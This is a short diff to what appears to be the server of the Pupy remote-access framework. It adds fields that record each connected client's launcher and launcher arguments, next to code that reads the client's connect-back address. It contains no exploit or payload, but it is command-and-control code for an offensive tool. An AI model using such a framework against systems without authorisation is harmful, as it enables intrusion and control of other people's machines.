@@ -141,8 +141,9 @@ class PupyServer(threading.Thread):
 				"macaddr" : l[6],
 				"pid" : l[7],
 				"address" : conn._conn._config['connid'].split(':')[0],
+				"launcher" : conn.get_infos("launcher"),
+				"launcher_args" : conn.get_infos("launcher_args"),
 			}, self))
-
 			if self.handler:
 				addr = conn.modules['pupy'].get_connect_back_host()
 				server_ip, server_port = addr.rsplit(':', 1)
